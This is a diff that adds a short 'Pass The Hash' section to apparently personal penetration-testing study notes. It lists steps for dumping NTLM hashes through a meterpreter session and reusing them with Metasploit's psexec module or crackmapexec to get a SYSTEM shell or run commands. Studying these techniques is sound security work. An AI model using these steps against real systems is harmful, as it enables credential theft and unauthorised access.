@@ -154,6 +154,27 @@ OR
 1. Upload mimikatz to target via meterpreter session
 
 ---
+# Pass The Hash 
+
+*Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.*
+
+We can use multiple tools to facilitate a Pass-The-Hash attack:
++ Metasploit PsExec module
++ Crackmapexec
+
+#### Pass the hash attack
+
+1. Get a meterpreter session 
+2. use kiwi to dump hash (`hashdump`)
+3. use `msf> exploit/windows/smb/psexec` on target user and NTLM hash
+4. set target if needed 
+5. get NT/AUTHORITY SYSTEM shell
+
+OR
+
+1. `crackmapexec IP -u USERNAME -H "HASH" -x "COMMMAND"`
+
+---
 # Windows configuration files
 
 *Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.*
